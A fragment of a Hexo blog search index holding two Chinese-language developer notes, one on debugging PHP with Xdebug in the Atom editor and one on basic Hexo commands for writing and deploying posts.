atom左下角debug按钮打开debug，没有监听到时显示的是 Listening on address:port 127.0.0.1:9000 在方法中打断点 (断点要注意了，如果打到空行，或者for循环里面将会无法监听到) 如图 浏览器中访问能进入到打断点的方法中 ，如 www.basic.com/test/test如果操作正确将会看到监听状态由 Listening on address:port 127.0.0.1:9000 改变成 Connected ,此时就可以使用debug调试了 如果没有改变监听状态，可能就是断点打错了，请检查如果atom的debug启动不起来，可能是9000端口被占用了，更改插件端口和php.ini 中的xdebug配置的端口即可 操作详解进入到断点将会输出一下内容，如下图其中，主要的有两部分内容 栈信息Stack 和变量值信息 Context其中 Stack 显示的是走到这个断点所经过的方法，如图从7到0，可以点击不同的栈来查看他的 变量值信息 Context Context 中显示的是变量信息，其中 Locals 显示的是方法中的变量值信息Superglobals 显示的是全局的信息 ，如 $_COOKLE、$_POST 等一些全局的信息User defined constants 显示的是定义的常量 操作 添加断点在代码的左边栏上点击，因为比较窄不好点击，也可以使用快捷键 alt + f9 Stop 释放掉监听 alt + f5Continue 走向下一个断点 Step Over 一步一步往下走 alt + f6Step In 进入到方法内 alt + f7Step Out 跳出方法 alt + f8 Restore Panels 恢复原始的展示窗口其他两个就是切换展示位置的 xdebug使用 xdebug使用 xdebug使用 xdebug使用 xdebug相关 xdebug相关 mac 安装 设置代码段 snippet 代码块 有一点不好的是，只能在某个语言环境中触发为某个语言设置的代码段 教程 实例 12345678&apos;.text.html.php&apos;: # 语言类型的 scope &apos;php&apos;: # 随便 &apos;prefix&apos;: &apos;header&apos; #触发单词 &apos;body&apos;: &apos;header(&quot;Content-Type:text/html;charset=utf-8&quot;);\n&apos; #\n 换行&apos;.text.html.php&apos;: &apos;yii&apos;: &apos;prefix&apos;: &apos;vy&apos; &apos;body&apos;: &apos;&lt;?=$$&#123;1:this&#125; ;?&gt;&apos; 问题 ctrl+, 快捷键无法打开 setting ,可能是因为快捷键冲突 Atom问题与解决 打开多个窗口时，在一个窗口添加项目，项目目录变的不可见点击并会报错解决 ： 参考 注意：先保存任何未保存的作业 win系统cmd运行 atom --clear-window-state 即可]]></content>
      <categories>
        <category>工具</category>
        <category>Atom</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello Hexo]]></title>
    <url>%2F2017%2F06%2F29%2FHello-hexo%2F</url>
    <content type="text"><![CDATA[特别声明文章md头部设置1234567891011121314---title: test #标题名称date: 2017-06-29 11:56:02 #时间tags: #创建标签 - Testing #标签名称 - begin #标签名称categories: hello hexo #分类---# 多级分类格式示例 categories: - 工具 - Atom 添加图片123456在source下创建images文件夹。![&apos;tupian&apos;](/images/my.jpg) images 是source下的文件夹也可以吧图片放在七牛进行引用。 使用详细操作请转到 hexo官方文档下面只用到一些基础的操作 第一步：先进入到博客目录 没有权限的加 sudo 1/Users/echo-ding/Documents/ding/www/github-blog 第二步：创建文章1hexo new &quot;My New Post&quot; #my new post 为文章名 也可以直接在source中创建md文档(一般用这个) 第三步：启动服务(为了先本地预览)1hexo server 简写&amp;带参数12hexo s --debug #默认以4000端口启动sudo hexo s --debug -p 80 #以80端口启动 第四部：生成文件(md转成html)1hexo generate 第五部：推送到远端1hexo deploy 如果不需要本地预览，就可以省略第三步了，直接生成、上传 代码高亮 在代码块开头后添加php表示php代码，用来高亮显示。 12345678class ClassName extends AnotherClass&#123; public function FunctionName($value='') &#123; echo "string"; &#125;&#125;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
